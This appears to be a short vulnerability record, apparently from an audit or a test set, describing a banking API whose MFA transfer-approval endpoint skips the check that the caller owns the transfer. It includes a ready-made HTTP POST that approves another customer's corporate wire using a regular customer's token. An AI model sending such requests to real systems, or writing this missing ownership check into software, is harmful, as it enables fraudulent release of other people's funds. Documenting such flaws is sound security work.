diagnosis: The step-up transfer authorization handler validates the caller's personal TOTP token, but executes approval on the transferId specified in the URL parameter without checking that the wire transfer was created by the caller. An attacker with a valid account and MFA token can approve and release pending high-value transfers initiated by other customers.
exploit_request:
POST /api/transfers/tx_wire_corporate_99218/authorize-mfa HTTP/1.1
Host: bank.transfers.internal:6004
Authorization: Bearer <regular_customer_jwt>
Content-Type: application/json

{
  "totpToken": "551920"
}
